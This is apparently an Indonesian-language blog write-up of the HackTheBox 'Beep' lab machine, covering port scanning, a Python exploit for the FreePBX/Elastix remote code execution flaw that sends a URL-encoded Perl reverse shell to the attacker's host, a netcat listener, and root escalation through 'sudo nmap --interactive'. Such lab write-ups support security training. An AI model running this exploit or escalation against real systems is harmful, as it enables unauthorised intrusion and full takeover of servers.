---
featured_image: "/uploads/justakazh/2023-01-02_11-28.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: paypal / saweria / buymecoffe / etc
author_web: https://blog.hackstreet.id
title: HackTheBox - Beep
date: 2023-01-02T00:00:00.000+07:00
author: Justakazh
tags:
- htb
- writeup
- rce
- voip
categories: capture the flag

---
## Summary

Machine Name : Beep

Machine Difficult : Easy

Machine Author : [ch4p](https://app.hackthebox.com/users/1)

Machine URL : [https://app.hackthebox.com/machines/Beep](https://app.hackthebox.com/machines/Beep "https://app.hackthebox.com/machines/Beep")

## Enumeration

Hal pertama yang kita lakukan adalah melakukan enumerasi terhadap common port yang terbuka pada server (beep.htb / 10.10.10.7) tersebut.

```bash
     # Nmap 7.92 scan initiated Mon Jan  2 10:08:00 2023 as: nmap -sS -oN nmapsScommon 10.10.10.7
    Nmap scan report for 10.10.10.7
    Host is up (0.33s latency).
    Not shown: 987 closed tcp ports (reset)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    25/tcp    open  smtp
    80/tcp    open  http
    110/tcp   open  pop3
    111/tcp   open  rpcbind
    143/tcp   open  imap
    443/tcp   open  https
    880/tcp   open  unknown
    993/tcp   open  imaps
    995/tcp   open  pop3s
    3306/tcp  open  mysql
    4445/tcp  open  upnotifyp
    10000/tcp open  snet-sensor-mgmt
    
    # Nmap done at Mon Jan  2 10:12:56 2023 -- 1 IP address (1 host up) scanned in 296.02 seconds
```

terdapat 13 Port yang terbuka pada server tersebut, mari kita identifikasi versi yang digunakan pada masing-masing service tersebut

```bash
    # Nmap 7.92 scan initiated Mon Jan  2 10:17:13 2023 as: nmap -p22,25,80,110,111,143,443,880,993,995,3306,4445,10000 -sV -oN nmapopenversion beep.htb
    Nmap scan report for beep.htb (10.10.10.7)
    Host is up (0.32s latency).
    
    PORT      STATE SERVICE    VERSION
    22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
    25/tcp    open  smtp       Postfix smtpd
    80/tcp    open  http       Apache httpd 2.2.3
    110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
    111/tcp   open  rpcbind    2 (RPC #100000)
    143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
    443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
    880/tcp   open  status     1 (RPC #100024)
    993/tcp   open  ssl/imap   Cyrus imapd
    995/tcp   open  pop3       Cyrus pop3d
    3306/tcp  open  mysql?
    4445/tcp  open  upnotifyp?
    10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
    Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Mon Jan  2 10:20:35 2023 -- 1 IP address (1 host up) scanned in 202.56 seconds
```

dapat dilihat pada hasil scanning tersebut port 80/http yang menggunakan web server Apache httpd 2.2.3

seperti biasa, mari kita check web tersebut tersebut terlebih dahulu [http://beep.htb ]()

![](/uploads/justakazh/2023-01-02_11-58.png)

dapat dilihat pada gambar diatas tersebut merupakan [Elastix]() yaitu perangkat lunak server komunikasi terpadu yang menyatukan fungsi IP PBX, email, IM, faks, dan kolaborasi. mari kita cari tahu tentang Elastix vulnerability yang tersedia pada internet

![](/uploads/justakazh/2023-01-02_12-07.png)

terkait dengan penjelasan exploit tersebut akan saya buatkan pada artikel yang berbeda "[FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution](https://blog.hackstreet.id/posts/freepbx-2.10.0-elastix-2.2.0-remote-code-execution/ "https://blog.hackstreet.id/posts/freepbx-2.10.0-elastix-2.2.0-remote-code-execution/")"

## Exploitation

berikut ini merupakan kode exploit yang akan kita gunakan untuk mendapatkan akses server tersebut (simpan ke exploit.py)

``` python
import urllib2
import ssl

rhost="10.10.10.7"
lhost="10.10.14.4"
lport=4444
extension="233"


ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib2.urlopen(url,context=ctx)
```

selanjutnya kita akan membuat listener pada port 4444 menggunakan netcat dengan mengetikan perintah

    nc -lnvp 4444

apabila semua requirement diatas sudah siap, mari kita jalankan exploit tersebut dengan mengetikan perintah

    python exploit.py

![](/uploads/justakazh/2023-01-02_12-20.png)

dapat dilihat pada gambar diatas tersebut kita berhasil mendapatkan akses server tersebut dengan user `asterisk`, selanjutnya mari kita melakukan privilege escalation untuk mendapatkan akses root.

## Privilege Escalation

sebelumnya kita bisa mengaktifkan TTY session agar command yang kita jalankan akan dieksekusi dengan baik, kita dapat menggunakan perintah

    script -qc /bin/bash /dev/null
    
    python -c 'import pty; pty.spawn("/bin/bash")'

selanjutnya mari kita check privileges yang terdapat user tersebut dengan mengetikan perintah :

    sudo -l
    
    bash-3.2$ sudo -l
    Matching Defaults entries for asterisk on this host:
        env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
        LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
        LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
        LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
        XAUTHORITY"
    
    User asterisk may run the following commands on this host:
        (root) NOPASSWD: /sbin/shutdown
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/bin/yum
        (root) NOPASSWD: /bin/touch
        (root) NOPASSWD: /bin/chmod
        (root) NOPASSWD: /bin/chown
        (root) NOPASSWD: /sbin/service
        (root) NOPASSWD: /sbin/init
        (root) NOPASSWD: /usr/sbin/postmap
        (root) NOPASSWD: /usr/sbin/postfix
        (root) NOPASSWD: /usr/sbin/saslpasswd2
        (root) NOPASSWD: /usr/sbin/hardware_detector
        (root) NOPASSWD: /sbin/chkconfig
        (root) NOPASSWD: /usr/sbin/elastix-helper
    bash-3.2$ 

user tersebut dapat menjalankan `nmap` sebagai root, kita bisa mendapatkan akses root melalui nmap tersebut dapat dilihat pada link berikut ini

* [https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/ "https://gtfobins.github.io/gtfobins/nmap/")

kita dapat mengetikan perintah berikut

    sudo nmap --interactive

ketika berhasil masuk dalam mode interactive nmap ketikan perintah berikut

    !sh

berikut ini output yang saya dapatkan

    bash-3.2$ sudo nmap --interactive
    
    Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
    Welcome to Interactive Mode -- press h <enter> for help
    nmap> EOF reached -- quitting
    QUITTING!
    bash-3.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
    bash: python3: command not found
    bash-3.2$ python -c 'import pty; pty.spawn("/bin/bash")'
    bash-3.2$ sudo nmap --interactive
    sudo nmap --interactive
    
    Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
    Welcome to Interactive Mode -- press h <enter> for help
    nmap> !sh
    !sh
    sh-3.2# id && whoami
    id && whoami
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
    root
    sh-3.2# 

HOREEE!

kita berhasil melakukan privilege escalation dan mendapatkan akses root pada server tersebut!